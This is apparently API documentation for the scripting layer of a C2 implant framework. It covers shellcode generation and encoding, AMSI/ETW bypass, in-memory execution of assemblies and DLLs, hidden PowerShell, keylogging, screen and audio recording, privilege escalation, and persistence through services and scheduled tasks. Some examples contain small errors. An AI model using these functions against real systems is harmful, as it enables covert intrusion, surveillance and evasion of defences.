## artifact

### artifact_bin

get artifact binary content by name

**Arguments**

- `sess` [Session] -  session
- `name` [string] -  artifact name

**Example**

```
artifact_bin(active(), "MAGIC_TOOL")
```

### artifact_payload

get artifact stageless shellcode

**Arguments**

- `pipeline` [string] -  pipeline id
- `format` [string] -  reserved parameter
- `os` [string] -  os, windows only
- `arch` [string] -  arch, x64/x86

**Example**

```
artifact_payload("tcp_default","raw","windows","x64")
```

### artifact_stager

get artifact stager shellcode

**Arguments**

- `pipeline` [string] -  pipeline id
- `format` [string] -  reserved parameter
- `os` [string] -  os, windows only
- `arch` [string] -  arch, x64/x86

**Example**

```
artifact_stager("tcp_default","raw","windows","x64")
```

### clr2shellcode

clr to shellcode with donut

**Arguments**

- `file` [string] -  path to PE file
- `arch` [string] -  architecture, x86/x64
- `cmdline` [string] -  cmd args
- `method` [string] -  name of method or DLL function to invoke for .NET DLL and unmanaged DLL
- `classname` [string] -  name of class with optional namespace for .NET DLL
- `appdomain` [string] -  name of domain to create for .NET DLL/EXE

### delete_artifact

delete artifact with special build name

**Arguments**

- `$1` [string] - 

### dll2shellcode

dll to shellcode with donut

**Arguments**

- `bin` [table] -  dll bin
- `arch` [string] -  architecture, x86/x64
- `param` [string] -  cmd args

### donut

Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters 

**Arguments**

- `file` [string] -  path to PE file
- `arch` [string] -  architecture, x86/x64
- `cmdline` [string] -  cmd args

### download_artifact

download artifact with special build id

**Arguments**

- `$1` [string] - 
- `$2` [string] - 
- `$3` [string] - 

### exe2shellcode

exe to shellcode with donut

**Arguments**

- `bin` [table] -  dll bin
- `arch` [string] -  architecture
- `param` [string] -  cmd args

### get_artifact

get artifact with session self

**Arguments**

- `sess` [Session] -  session
- `format` [string] -  only support shellcode

### search_artifact

search build artifact with arch,os,typ and pipeline id

**Arguments**

- `pipeline` [string] -  pipeline id
- `type` [string] -  build type, beacon,bind,prelude
- `format` [string] -  only support shellcode
- `arch` [string] -  arch
- `os` [string] -  os

**Example**

```
search_artifact("x64","windows","beacon","tcp_default", true)
```

### self_artifact

get artifact with session self

**Arguments**

- `sess` [Session] -  session

### self_payload

get self artifact stageless shellcode

**Arguments**

- `sess` [Session] -  Session

**Example**

```
self_payload(active())
```

### self_stager

get self artifact stager shellcode

**Arguments**

- `sess` [Session] -  session

**Example**

```
self_payload(active())
```

### sgn_encode

shellcode encode with sgn

**Arguments**

- `bin` [table] -  shellcode bin
- `arch` [string] -  architecture, x86/x64
- `iterations` [number] -  sgn iterations

### srdi

dll/exe to shellcode with srdi

**Arguments**

- `bin` [table] -  dll/exe bin
- `entry` [string] -  entry function for dll
- `arch` [string] -  architecture, x86/x64
- `param` [string] -  cmd args

### upload_artifact

upload local bin to server build

**Arguments**

- `$1` [string] - 
- `$2` [string] - 
- `$3` [string] - 
- `$4` [string] - 

## basic

### active

get current session


**Example**

```
active()
```

### add_credential

**Arguments**

- `$1` [Session] 
- `$2` [Task] 
- `$3` [string] 
- `$4` [any] 

### add_download

**Arguments**

- `$1` [Session] 
- `$2` [Task] 
- `$3` [table] 

### add_keylogger

**Arguments**

- `$1` [Session] 
- `$2` [Task] 
- `$3` [table] 

### add_port

**Arguments**

- `$1` [Session] 
- `$2` [Task] 
- `$3` [table] 

### add_screenshot

**Arguments**

- `$1` [Session] 
- `$2` [Task] 
- `$3` [table] 

### add_upload

**Arguments**

- `$1` [Session] 
- `$2` [Task] 
- `$3` [table] 

### assemblyprint

**Arguments**

- `$1` [TaskContext] 

### async_run

**Arguments**

- `$1` [any] 

### barch

**Arguments**

- `$1` [Session] 

### bdata

get session custom data

**Arguments**

- `$1` [Session] - 

**Example**

```
bdata(active())
```

### blog

**Arguments**

- `$1` [Session] 
- `$2` [string] 

### broadcast

**Arguments**

- `$1` [string] 

### callback_append

**Arguments**

- `$1` [string] 

### callback_bof

**Arguments**

- `$1` [Session] 

### callback_context

**Arguments**

- `$1` [Session] 

### callback_discard


### callback_file

**Arguments**

- `$1` [string] 

### callback_log

**Arguments**

- `$1` [Session] 
- `$2` [boolean] 

### check_module

**Arguments**

- `$1` [Session] 
- `$2` [string] 

### console


### credentials


### curl

**Arguments**

- `session` [Session] -  special session
- `url` [string] -  target url
- `method` [string] -  HTTP method
- `timeout` [number] -  request timeout in seconds
- `body` [table] -  request body
- `headers` [any] -  request headers

**Example**

```
curl(active(),"http://example.com","GET",30,nil,nil)
```

### data

get session data

**Arguments**

- `$1` [Session] - 

**Example**

```
data(active())
```

### downloads


### execute

**Arguments**

- `$1` [Session] 
- `$2` [string] 

### execute_addon

**Arguments**

- `$1` [Session] 
- `$2` [string] 
- `$3` [table<string>] 
- `$4` [boolean] 
- `$5` [number] 
- `$6` [string] 
- `$7` [string] 
- `$8` [SacrificeProcess] 

### execute_module

**Arguments**

- `session` [Session] -  special session
- `spite` [Spite] -  the spite request to execute
- `expect` [string] -  expected response type name

**Example**

```
execute_module(active(), spite, "expect_type")
```

### find_global_resource

**Arguments**

- `$1` [Session] 
- `$2` [string] 
- `$3` [string] 

### find_resource

**Arguments**

- `$1` [Session] 
- `$2` [string] 
- `$3` [string] 

### format_path

format windows path

**Arguments**

- `s` [string] - 

**Example**

```

format_path("C:\\Windows\\System32\\calc.exe")

```

### get

**Arguments**

- `$1` [Task] 
- `$2` [number] 

### global_resource

**Arguments**

- `$1` [string] 

### is64

**Arguments**

- `$1` [Session] 

### is_full_path

**Arguments**

- `$1` [string] 

### isactive

**Arguments**

- `$1` [Session] 

### isadmin

**Arguments**

- `$1` [Session] 

### isbeacon

**Arguments**

- `$1` [Session] 

### keyloggers


### list_addon

**Arguments**

- `$1` [Session] 

### list_devices

**Arguments**

- `session` [Session] -  special session

**Example**

```
list_devices
```

### list_module

**Arguments**

- `$1` [Session] 

### listeners


### load_addon

**Arguments**

- `$1` [Session] 
- `$2` [string] 
- `$3` [string] 
- `$4` [string] 

### log

**Arguments**

- `$1` [Session] 
- `$2` [string] 
- `$3` [boolean] 

### media_contexts


### new_64_executable

new x64 process execute binary config

**Arguments**

- `module` [string] - 
- `filename` [string] -  path to the binary
- `argsStr` [string] -  command line arguments
- `sacrifice` [SacrificeProcess] -  sacrifice process

**Example**

```

sac = new_sacrifice(123, false, false, false, "")
new_64_exec = new_64_executable("module", "filename", "args", sac)

```

### new_86_executable

new x86 process execute binary config

**Arguments**

- `module` [string] - 
- `filename` [string] -  path to the binary
- `argsStr` [string] -  command line arguments
- `sacrifice` [SacrificeProcess] -  sacrifice process

**Example**

```

sac = new_sacrifice(123, false, false, false, "")
new_86_exec = new_86_executable("module", "filename", "args", sac)

```

### new_binary

new execute binary config

**Arguments**

- `module` [string] - 
- `filename` [string] -  path to the binary
- `args` [table<string>] -  command line arguments
- `output` [boolean] - 
- `timeout` [number] - 
- `arch` [string] - 
- `process` [string] - 
- `sacrifice` [SacrificeProcess] -  sacrifice process

**Example**

```

sac = new_sacrifice(123, false, false, false, "")
new_bin = new_binary("module", "filename", "args", true, 100, "amd64", "process", sac)

```

### new_bypass

new bypass options

**Arguments**

- `bypassAMSI` [boolean] - 
- `bypassETW` [boolean] - 
- `bypassWLDP` [boolean] - 

**Example**

```

params = new_bypass(true, true, true)

```

### new_bypass_all

new bypass all options


**Example**

```

params = new_bypass_all()

```

### new_sacrifice

new sacrifice process config

**Arguments**

- `ppid` [number] -  parent process id
- `hidden` [boolean] - 
- `blockDll` [boolean] - 
- `disableETW` [boolean] - 
- `argue` [string] -  arguments

**Example**

```

sac = new_sacrifice(123, false, false, false, "")

```

### notify

**Arguments**

- `$1` [string] 

### pack_binary

**Arguments**

- `$1` [string] 

### pack_bof

pack bof single argument

**Arguments**

- `format` [string] - 
- `arg` [string] - 

**Example**

```
pack_bof("Z", "aa")
```

### pack_bof_args

pack bof arguments

**Arguments**

- `format` [string] - 
- `args` [table<string>] - 

**Example**

```

pack_bof_args("ZZ", {"aa", "bb"})

```

### pipe_close

**Arguments**

- `session` [Session] -  special session
- `name` [string] -  name of the pipe

**Example**

```
pipe_close(active(), "pipe_name")
```

### pipe_upload_raw

**Arguments**

- `$1` [Session] 
- `$2` [string] 
- `$3` [string] 

### pipelines


### pivots


### ports


### read_global_resource

**Arguments**

- `$1` [string] 

### read_resource

**Arguments**

- `$1` [string] 

### record_audio

**Arguments**

- `session` [Session] -  special session
- `device_name` [string] -  device name
- `output` [string] -  output path
- `time` [string] -  duration

**Example**

```
record_audio
```

### record_screen

**Arguments**

- `session` [Session] -  special session
- `device_name` [string] -  device name
- `output` [string] -  output path
- `time` [string] -  duration

**Example**

```
record_screen
```

### record_video

**Arguments**

- `session` [Session] -  special session
- `device_name` [string] -  device name
- `output` [string] -  output path
- `time` [string] -  duration

**Example**

```
record_video
```

### reg_list_value

**Arguments**

- `$1` [Session] 
- `$2` [string] 
- `$3` [string] 

### rem_link

**Arguments**

- `$1` [string] 

### run

**Arguments**

- `$1` [any] 

### screenshots


### script_resource

**Arguments**

- `$1` [string] 

### sessions


### shellsplit

**Arguments**

- `$1` [string] 

### spite

**Arguments**

- `$1` [any] 

### taskprint

**Arguments**

- `$1` [TaskContext] 

### timestamp_format

**Arguments**

- `$1` [string] 

### ui_group

**Arguments**

- `$1` [table] 
- `$2` [string] 

### ui_order

**Arguments**

- `$1` [table] 
- `$2` [number] 

### ui_placeholder

**Arguments**

- `$1` [table] 
- `$2` [string] 

### ui_range

**Arguments**

- `$1` [table] 
- `$2` [number] 
- `$3` [number] 

### ui_required

**Arguments**

- `$1` [table] 
- `$2` [boolean] 

### ui_set

**Arguments**

- `$1` [table] 
- `$2` [any] 

### ui_widget

**Arguments**

- `$1` [table] 
- `$2` [string] 

### uploadraw

**Arguments**

- `$1` [Session] 
- `$2` [string] 
- `$3` [string] 
- `$4` [string] 
- `$5` [boolean] 

### uploads


### wait

**Arguments**

- `$1` [Task] 

### with_context

**Arguments**

- `$1` [Session] 
- `$2` [string] 

### with_context_id

**Arguments**

- `$1` [Session] 
- `$2` [string] 

### with_context_kind

**Arguments**

- `$1` [Session] 
- `$2` [string] 

### with_context_name

**Arguments**

- `$1` [Session] 
- `$2` [string] 

### with_value

**Arguments**

- `$1` [Session] 
- `$2` [string] 
- `$3` [string] 

### with_values

**Arguments**

- `$1` [Session] 
- `$2` [table<string>] 

## client

### addon_completer


### all_pipeline_completer


### artifact_completer


### artifact_name_completer


### bind_args_completer

**Arguments**

- `$1` [table] - 
- `$2` [table] - 

### bind_flags_completer

**Arguments**

- `$1` [table] - 
- `$2` [any] - 

### command

**Arguments**

- `$1` [string] - 
- `$2` [table] - 
- `$3` [string] - 
- `$4` [string] - 

### content_completer


### example

**Arguments**

- `$1` [string] - 
- `$2` [string] - 

### help

**Arguments**

- `$1` [string] - 
- `$2` [string] - 

### listener_completer


### listener_with_pipeline_completer


### module_completer


### opsec

**Arguments**

- `$1` [string] - 
- `$2` [number] - 

### profile_completer


### rem_agent_completer


### rem_completer


### resource_completer


### session_completer


### sync_completer


### target_completer


### task_completer


### type_completer


### values_completer

**Arguments**

- `$1` [table<string>] - 

### website_completer


## encode

### arg_hex

hexlify encode

**Arguments**

- `input` [string] - 

**Example**

```
arg_hex("aa")
```

### base64_decode

base64 decode

**Arguments**

- `input` [string] - 

**Example**

```
base64_decode("aGVsbG8=")
```

### base64_encode

**Arguments**

- `input` [string] - 

**Example**

```
base64_encode("hello")
```

### file_exists

check file exists

**Arguments**

- `path` [string] - 

**Example**

```
file_exists("C:\\Windows\\System32\\calc.exe")
```

### parse_hex

parse hex string to int64

**Arguments**

- `hexString` [string] - 

**Example**

```
parse_hex("0x1f04")
```

### parse_octal

parse octal string to int64

**Arguments**

- `octalString` [string] - 

**Example**

```
parse_octal("0o744")
```

### random_string

generate random string

**Arguments**

- `length` [number] - 

**Example**

```
random_string(10)
```

### timestamp

Get current timestamp in milliseconds or formatted date string.


**Example**

```
timestampOrFormatted(), timestampOrFormatted("01/02 15:04")
```

## execute

### bof

COFF Loader,  executes Bof (Windows Only)


refactor from https://github.com/hakaioffsec/coffee ,fix a bundle bugs

Arguments for the BOF can be passed after the -- delimiter. Each argument must be prefixed with the type of the argument followed by a colon (:). The following types are supported:

* str - A null-terminated string
* wstr - A wide null-terminated string
* int - A signed 32-bit integer
* short - A signed 16-bit integer
* bin - A base64-encoded binary blob


**Arguments**

- `session` [Session] -  special session
- `bofPath` [string] -  path to BOF
- `args` [table<string>] -  arguments
- `output` [boolean] -  output

**Example**

```
bof(active(),"/path/dir.x64.o",{"/path/to/list"},true)
```

### dllspawn

DllSpawn the given DLL in the sacrifice process

use a custom Headless PE loader to load DLL in the sacrificed process.

**Arguments**

- `session` [Session] -  special session
- `dllPath` [string] - 
- `entrypoint` [string] - 
- `args` [string] - 
- `binPath` [string] - 
- `output` [boolean] - 
- `timeout` [number] - 
- `arch` [string] - 
- `process` [string] - 
- `sac` [SacrificeProcess] -  sacrifice process

**Example**

```
dllspawn(active(),"example.dll",{},true,60,"","",new_sacrifice(1234,false,true,true,""))
```

### exec

Execute cmd with powershell

equal: powershell.exe -ExecutionPolicy Bypass -w hidden -nop "[cmdline]"

**Arguments**

- `sessions` [Session] - 
- `cmd` [string] - 
- `realtime` [boolean] - 
- `output` [boolean] - 

**Example**

```
exec(active(),`whoami`,true)
```

### execute_assembly

Loads and executes a .NET assembly in implant process (Windows Only)


Load CLR assembly in sacrifice process (with donut)


**Arguments**

- `sessions` [Session] - 
- `path` [string] - 
- `args` [table<string>] - 
- `output` [boolean] - 
- `param, bypass amsi,wldp,etw` [any] - 
- `sac, sacrifice process` [SacrificeProcess] - 

**Example**

```
execute_assembly(active(),"sharp.exe",{}, true, new_bypass_all(), new_sacrifice(1234,false,true,true,""))
```

### execute_dll

Executes the given DLL in the sacrifice process


use a custom Headless PE loader to load DLL in the sacrificed process.


**Arguments**

- `session` [Session] -  special session
- `dllPath` [string] - 
- `entrypoint` [string] - 
- `args` [table<string>] - 
- `binPath` [string] - 
- `output` [boolean] - 
- `timeout` [number] - 
- `arch` [string] - 
- `process` [string] - 
- `sac` [SacrificeProcess] -  sacrifice process

**Example**

```
execute_dll(active(),"example.dll",{},true,60,"","",new_sacrifice(1234,false,true,true,""))
```

### execute_exe

Executes the given PE in the sacrifice process

use a custom Headless PE loader to load EXE in the sacrificed process.

**Arguments**

- `session` [Session] -  special session
- `pePath` [string] -  PE file
- `args` [table<string>] -  PE args
- `output` [boolean] - 
- `timeout` [number] - 
- `arch` [string] - 
- `process` [string] - 
- `sac` [SacrificeProcess] -  sacrifice process

**Example**

```
execute_exe(active(),"/path/to/gogo.exe",{"-i","127.0.0.1"},true,60,"","",new_sacrifice(1234,false,true,true,""))
```

### execute_local

Execute local PE on sacrifice process


Execute local PE on sacrifice process, support spoofing process arguments, spoofing ppid, block-dll, disable etw
		

**Arguments**

- `session` [Session] -  special session
- `args` [table<string>] -  arguments
- `output` [boolean] - 
- `process` [string] - 
- `sacrifice` [SacrificeProcess] -  sacrifice process

**Example**

```
execute_local(active(),{"-i","127.0.0.1","-p","top2"},true,"gogo.exe",new_sacrifice(1234,false,true,true,"argue"))
```

### execute_shellcode

Executes the given shellcode in the sacrifice process

The current shellcode injection method uses APC.

In the future, configurable shellcode injection settings will be provided, along with Donut, SGN, SRDI, etc.

**Arguments**

- `session` [Session] -  special session
- `shellcodePath` [string] -  path to shellcode
- `args` [table<string>] -  arguments
- `output` [boolean] - 
- `timeout` [number] - 
- `arch` [string] - 
- `process` [string] - 
- `sac` [SacrificeProcess] -  sacrifice process

**Example**

```
execute_shellcode(active(), "/path/to/shellcode", {}, true, 60, "x64", "",new_sacrifice(1234,false,true,true)
```

### inline_assembly

Loads and inline execute a .NET assembly (Windows Only)

Load CLR assembly in implant process(will not create new process)

if return 0x80004005, please use --amsi bypass.

**Arguments**

- `sessions` [Session] - 
- `path` [string] - 
- `args` [table<string>] - 
- `output` [boolean] - 
- `bypass_params` [any] - 

**Example**

```
inline_assembly(active(),"seatbelt.exe",{},true,new_bypass_all())
```

### inline_dll

Executes the given inline DLL in the current process


use a custom Headless PE loader to load DLL in the current process.

!!! important ""instability warning!!!"
	inline execute dll may cause the implant to crash, please use with caution.


**Arguments**

- `session` [Session] -  special session
- `path` [string] - 
- `entryPoint` [string] - 
- `args` [table<string>] - 
- `output` [boolean] - 
- `timeout` [number] - 
- `arch` [string] - 
- `process` [string] - 

**Example**

```
inline_dll(active(),"example.dll","",{"arg1","arg2"},true,60,"","")
```

### inline_exe

Executes the given inline EXE in current process


use a custom Headless PE loader to load EXE in the current process.

!!! important ""instability warning!!!"
	inline execute exe may cause the implant to crash, please use with caution.
	
	if double run same exe, More likely to crash


**Arguments**

- `session` [Session] -  special session
- `path` [string] -  PE file
- `args` [table<string>] -  PE args
- `output` [boolean] - 
- `timeout` [number] - 
- `arch` [string] - 
- `process` [string] - 

**Example**

```
inline_exe(active(),"gogo.exe",{"-i","127.0.0.1"},true,60,"",""))
```

### inline_local

Execute inline PE on implant process


Execute inline PE on implant process, support spoofing process arguments


**Arguments**

- `session` [Session] -  special session
- `args` [table<string>] -  arguments
- `output` [boolean] - 
- `process` [string] - 

**Example**

```
inline_local(active(),{""},true,"whoami")
```

### inline_shellcode

Executes the given inline shellcode in the implant process


The current shellcode injection method uses APC.

!!! important ""instability warning!!!"
	inline execute shellcode may cause the implant to crash, please use with caution.


**Arguments**

- `session` [Session] -  special session
- `path` [string] - 
- `args` [table<string>] - 
- `output` [boolean] - 
- `timeout` [number] - 
- `arch` [string] - 
- `process` [string] - 

**Example**

```
inline_shellcode(active(),"/path/to/shellcode",{},true,60,"x64","")
```

### powerpick

unmanaged powershell on implant process (Windows Only)

**Arguments**

- `session` [Session] -  special session
- `path` [string] -  powershell script
- `powershell` [table<string>] -  powershell cmdline
- `param` [any] -  bypass amsi,etw,wldp

**Example**

```
powerpick(active(),"powerview.ps1",{""},new_bypass_all()))
```

### powershell

Execute cmd with powershell

equal: powershell.exe -ExecutionPolicy Bypass -w hidden -nop "[cmdline]"

**Arguments**

- `session` [Session] - 
- `cmd` [string] - 
- `output` [boolean] - 

**Example**

```
powershell(active(),"dir",true))
```

### shell

Execute cmd

equal: exec cmd /c "[cmdline]"

**Arguments**

- `sessions` [Session] - 
- `cmd` [string] - 
- `output` [boolean] - 

**Example**

```
shell(active(),"whoami",true)
```

## file

### cat

Print file content

concatenate and display the contents of file in implant

**Arguments**

- `session` [Session] -  special session
- `fileName` [string] -  file to print

**Example**

```
cat(active(),"file.txt")
```

### cd

Change directory

change the shell's current working directory in implant

**Arguments**

- `session` [Session] -  special session
- `path` [string] -  path to change directory

**Example**

```
cd(active(),"path")
```

### chmod

Change file mode

change the permissions of files and directories in implant

**Arguments**

- `session` [Session] -  special session
- `path` [string] -  file to change mode
- `mode` [string] -  mode to change

**Example**

```
chmod(active(),"file.txt","644")
```

### chown

Change file owner

change the ownership of a file or directory in implant

**Arguments**

- `session` [Session] -  special session
- `path` [string] -  file to change owner
- `uid` [string] -  user to change
- `gid` [string] -  group to change
- `recursive` [boolean] -  recursive

**Example**

```
chown(active(),"file.txt","username","groupname",true)
```

### cp

Copy file

copy files and directories in implant

**Arguments**

- `session` [Session] -  special session
- `originPath` [string] -  origin path
- `targetPath` [string] -  target path

**Example**

```
cp(active(),"source","target")
```

### download

Download file

download file in implant

**Arguments**

- `session` [Session] -  special session
- `path` [string] -  file path
- `id_dir` [boolean] -  download_dir

**Example**

```
download(active(),`file.txt`)
```

### enum_drivers

Enum Drivers

**Arguments**

- `session` [Session] -  special session

**Example**

```
enum_drivers(active())
```

### ls

List directory

list directory contents in implant

**Arguments**

- `session` [Session] -  special session
- `path` [string] -  path to list files

**Example**

```
ls(active(),"/tmp")
```

### mkdir

Make directory

make directories in implant

**Arguments**

- `session` [Session] -  special session
- `path` [string] -  dir

**Example**

```
mkdir(active(),"/tmp")
```

### mv

Move file

move files and directories in implant

**Arguments**

- `session` [Session] -  special session
- `sourcePath` [string] -  source path
- `targetPath` [string] -  target path

**Example**

```
mv(active(),"/tmp/file1.txt","/tmp/file2.txt")
```

### pipe_read

Read data from a named pipe

Read data from a specified named pipe.

**Arguments**

- `session` [Session] -  special session
- `name` [string] -  name of the pipe

**Example**

```
pipe_read(active(), "pipe_name")
```

### pipe_server

Manage pipe server operations

Start, stop, or list pipe servers for receiving data from clients.

**Arguments**

- `session` [Session] -  special session
- `action` [string] -  pipe server action (start/stop/list/clear/status)
- `pipe_name` [string] -  name of the pipe (required for start/stop/clear/status)

**Example**

```
pipe_server(active(), "action", "pipe_name")
```

### pipe_upload

Upload file to a named pipe

Upload the content of a specified file to a named pipe.

**Arguments**

- `session` [Session] -  special session
- `pipe` [string] -  target pipe
- `path` [string] -  file path to upload

**Example**

```
pipe_upload(active(), "pipe_name", "file_path")
```

### pwd

Print working directory

print working directory in implant

**Arguments**

- `session` [Session] -  special session

**Example**

```
pwd(active())
```

### rm

Remove file

remove files and directories in implant

**Arguments**

- `session` [Session] -  special session
- `fileName` [string] -  file to remove

**Example**

```
pwd(active(),"/tmp/file.txt")
```

### upload

Upload file to a named pipe

Upload the content of a specified file to a named pipe.

**Arguments**

- `session` [Session] -  special session
- `path` [string] -  source path
- `target` [string] -  target path
- `priv` [string] - 
- `hidden` [boolean] - 

**Example**

```
upload(active(),"/source/path","/target/path",parse_octal("644"),false)
```

## implant

### cancel_task

Cancel a task by task_id

**Arguments**

- `sess` [Session] - special session
- `task_id` [number] - task id

**Example**

```
cancel_task <task_id>
```

### clear

Clear modules

**Arguments**

- `session` [Session] -  special session

**Example**

```
clear(active())
```

### list_task

List all tasks

**Arguments**

- `sess` [Session] - special session

**Example**

```
list_task
```

### load_module

Load module

**Arguments**

- `session` [Session] -  special session
- `bundle_name` [string] -  bundle name
- `path` [string] -  path to the module file

**Example**

```
load_module(active(),"bundle_name","module_file.dll")
```

### query_task

Query a task by task_id

**Arguments**

- `sess` [Session] - special session
- `task_id` [number] - task id

**Example**

```
query_task <task_id>
```

### refresh_module

Refresh module

**Arguments**

- `session` [Session] -  special session

**Example**

```
refresh_module(active())
```

### sleep

change implant sleep config

**Arguments**

- `sess` [Session] - special session
- `cron` [string] - cron expression
- `jitter` [number] - jitter, percentage of interval

**Example**

```
sleep(active(), 10, 0.5)
```

### suicide

kill implant

**Arguments**

- `sess` [Session] - special session

**Example**

```
suicide(active())
```

## listener

### webcontent_add

**Arguments**

- `$1` [string] - 
- `$2` [string] - 
- `$3` [string] - 
- `$4` [string] - 

### webcontent_remove

**Arguments**

- `$1` [string] - 

### webcontent_update

**Arguments**

- `$1` [string] - 
- `$2` [string] - 
- `$3` [string] - 
- `$4` [string] - 

### website_new

**Arguments**

- `$1` [string] - 
- `$2` [string] - 
- `$3` [string] - 
- `$4` [number] - 
- `$5` [string] - 
- `$6` [string] - 
- `$7` [TLS] - 

### website_start

**Arguments**

- `$1` [string] - 
- `$2` [string] - 

### website_stop

**Arguments**

- `$1` [string] - 

## pivot

### rem_dial

Run rem on the implant

**Arguments**

- `session` [Session] -  special session
- `pipeline` [string] -  pipeline name
- `args` [table<string>] -  command args

**Example**

```
rem_dial(active(),"pipeline1",{"-p","1080"})
```

## sys

### bypass

Bypass AMSI and ETW

**Arguments**

- `sess` [Session] -  special session
- `bypass_amsi` [boolean] -  bypass amsi
- `bypass_etw` [boolean] -  bypass etw

**Example**

```
bypass(active(), true, true)
```

### env

List environment variables

**Arguments**

- `sess` [Session] - special session

**Example**

```
env(active())
```

### env_set

Set environment variable

**Arguments**

- `sess` [Session] - special session
- `envName` [string] - env name
- `value` [string] - env value

**Example**

```
env(active(), "name", "value")
```

### env_unset

Unset environment variable

**Arguments**

- `sess` [Session] - special session
- `envName` [string] - env name

**Example**

```
unsetenv(active(), "envName")
```

### getsystem

Attempt to elevate privileges

**Arguments**

- `session` [Session] -  special session

**Example**

```
getsystem(active())
```

### kill

Kill the process by pid

**Arguments**

- `session` [Session] -  special session
- `pid` [string] -  process id

**Example**

```
kill(active(),pid)
```

### netstat

List network connections

**Arguments**

- `sess` [Session] -  special session

**Example**

```
netstat(active)
```

### privs

List available privileges

**Arguments**

- `session` [Session] -  special session

**Example**

```
privs(active())
```

### ps

List processes

**Arguments**

- `sess` [Session] - special session

**Example**

```
ps(active)
```

### reg_add

Add or modify a registry key

Add or modify a registry key with specified values. Supported types: REG_SZ, REG_BINARY, REG_DWORD, REG_QWORD

**Arguments**

- `session` [Session] -  special session
- `hive` [string] -  registry hive
- `path` [string] -  registry path
- `valueName` [string] -  value name
- `valueType` [string] -  value type (REG_SZ, REG_BINARY, REG_DWORD, REG_QWORD)
- `data` [string] -  value data

**Example**

```
reg_add(active(),"HKEY_LOCAL_MACHINE","SOFTWARE\Example","TestValue","REG_DWORD","1")
```

### reg_delete

Delete a registry key

Remove a specific registry key.

**Arguments**

- `session` [Session] -  special session
- `hive` [string] -  registry hive
- `path` [string] -  registry path
- `key` [string] -  registry key

**Example**

```
reg_delete(active(),"HKEY_LOCAL_MACHINE","SOFTWARE\Example","TestKey")
```

### reg_list_key

List subkeys in a registry path

Retrieve a list of all subkeys under a specified registry path.

**Arguments**

- `session` [Session] -  special session
- `hive` [string] -  registry hive
- `path` [string] -  registry path

**Example**

```
reg_list_key(active(),"HKEY_LOCAL_MACHINE","SOFTWARE\Example")
```

### reg_query

Query a registry key

Retrieve the value associated with a specific registry key.

**Arguments**

- `session` [Session] -  special session
- `hive` [string] -  registry hive
- `path` [string] -  registry path
- `key` [string] -  registry

**Example**

```
reg_query(active(),"HKEY_LOCAL_MACHINE","SOFTWARE\Example","TestKey")
```

### rev2self

Revert to the original token

**Arguments**

- `session` [Session] -  special session

**Example**

```
rev2self(active())
```

### runas

Run a program as another user

**Arguments**

- `session` [Session] -  special session
- `username` [string] - 
- `domain` [string] - 
- `password` [string] - 
- `program` [string] - 
- `args` [string] - 
- `use profile` [boolean] - 
- `use env` [boolean] - 
- `netonly` [boolean] - 

**Example**

```
runas(active(),"admin","EXAMPLE","password123","/path/to/program","arg1 arg2",0,false)
```

### service_create

Create a new service

Create a new service with specified name, display name, executable path, start type, error control, and account name.
		
Control the start type and error control by providing appropriate values.

**Arguments**

- `session` [Session] -  special session
- `name` [string] -  service name
- `displayName` [string] -  display name
- `executablePath` [string] -  executable path
- `startType` [string] -  start type
- `errorControl` [string] -  error control
- `accountName` [string] -  account name

**Example**

```
service_create(active(), "service_name", "display", "path", 0, 0, "account")
```

### service_delete

Delete a specified service

Delete a service by specifying its name, removing it from the system permanently.

**Arguments**

- `session` [Session] -  special session
- `name` [string] -  service name

**Example**

```
service_delete(active(),"service_name")
```

### service_list

List all available services

Retrieve and display a list of all services available on the system, including their configuration and current status.

**Arguments**

- `session` [Session] -  special session

**Example**

```
service_list(active())
```

### service_query

Query the status of a service

Retrieve the current status and configuration of a specified service.

**Arguments**

- `session` [Session] -  special session
- `name` [string] -  service name

**Example**

```
service_query(active(),"service_name")
```

### service_start

Start an existing service

Start a service by specifying its name.

**Arguments**

- `session` [Session] -  special session
- `name` [string] -  service name

**Example**

```
service_start(active(),"service_name")
```

### service_stop

Stop a running service

Stop a service by specifying its name. This command will halt the service's operation.

**Arguments**

- `session` [Session] -  special session
- `name` [string] -  service name

**Example**

```
service_stop(active(),"service_name")
```

### sysinfo

Get basic sys info

**Arguments**

- `sess` [Session] -  special session

**Example**

```
sysinfo(active)
```

### taskschd_create

Create a new scheduled task

Create a new scheduled task with the specified name, executable path, trigger type, and start boundary.

**Arguments**

- `sess` [Session] -  special session
- `name` [string] -  name of the scheduled task
- `path` [string] -  path to the executable for the scheduled task
- `task_folder` [string] -  task folder for the scheduled task
- `triggerType` [string] -  trigger type for the task
- `startBoundary` [string] -  start boundary for the scheduled task

**Example**

```
taskschd_create(active(), "task_name", "process_path", 1, "2023-10-10T09:00:00")
```

### taskschd_delete

Delete a scheduled task

Delete a scheduled task by specifying its name.

**Arguments**

- `session` [Session] -  special session
- `name` [string] -  name of the scheduled task
- `task_folder` [string] -  task folder

**Example**

```
taskschd_delete(active(), "task_name")
```

### taskschd_list

List all scheduled tasks

Retrieve a list of all scheduled tasks on the system.

**Arguments**

- `sess` [Session] -  special session

**Example**

```
taskschd_list(active())
```

### taskschd_query

Query the configuration of a scheduled task

Retrieve the current configuration, status, and timing information of a specified scheduled task by name.

**Arguments**

- `session` [Session] -  special session
- `name` [string] -  name of the scheduled task
- `task_folder` [string] -  task folder

**Example**

```
taskschd_query(active(), "task_name")
```

### taskschd_run

Run a scheduled task immediately

Execute a scheduled task immediately by specifying its name.

**Arguments**

- `session` [Session] -  special session
- `name` [string] -  name of the scheduled task
- `task_folder` [string] -  task folder

**Example**

```
taskschd_run(active(), "task_name")
```

### taskschd_start

Start a scheduled task

Start a scheduled task by specifying its name.

**Arguments**

- `session` [Session] -  special session
- `name` [string] -  name of the scheduled task
- `task_folder` [string] -  task folder

**Example**

```
taskschd_create(active(), "task_name")
```

### taskschd_stop

Stop a running scheduled task

Stop a scheduled task by specifying its name.

**Arguments**

- `session` [Session] -  special session
- `name` [string] -  name of the scheduled task
- `task_folder` [string] -  task folder

**Example**

```
taskschd_stop(active(), "task_name")
```

### whoami

Print current user

**Arguments**

- `sess` [Session] -  special session

**Example**

```
whoami(active())
```

### wmi_execute

Execute a WMI method

Executes a specified method within a WMI class, allowing for more complex administrative actions via WMI.

**Arguments**

- `session` [Session] -  special session
- `namespace` [string] -  WMI namespace
- `className` [string] -  WMI class name
- `methodName` [string] -  WMI method name
- `params` [any] -  WMI method parameters

**Example**

```
wmi_execute(active(), "root\\cimv2", "Win32_Process", "Create", {"CommandLine":"cmd.exe"})
```

### wmi_query

Perform a WMI query

